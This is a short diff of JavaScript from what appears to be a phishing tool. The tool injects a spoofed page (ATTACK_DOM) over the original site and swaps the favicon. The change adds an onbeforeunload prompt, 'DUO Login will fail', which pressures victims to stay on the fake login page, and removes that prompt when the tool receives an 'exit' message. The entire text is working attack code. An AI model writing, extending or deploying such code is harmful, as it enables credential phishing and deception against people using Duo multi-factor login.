@@ -16,6 +16,7 @@ function changeFavicon(src) {
 
 window.addEventListener("message", function(event) {
 	if (event.data == "exit") {
+		window.onbeforeunload = undefined;
 		window.location = ORIG_DOM; 
 	}
 	else {
@@ -37,3 +38,7 @@ function injectHTML(page) {
 	document.getElementsByTagName("html")[0].style.display = "block";
 }
 injectHTML(ATTACK_DOM)
+window.onbeforeunload = function() {
+	return 'Are you sure you want to leave? DUO Login will fail.';
+}
+
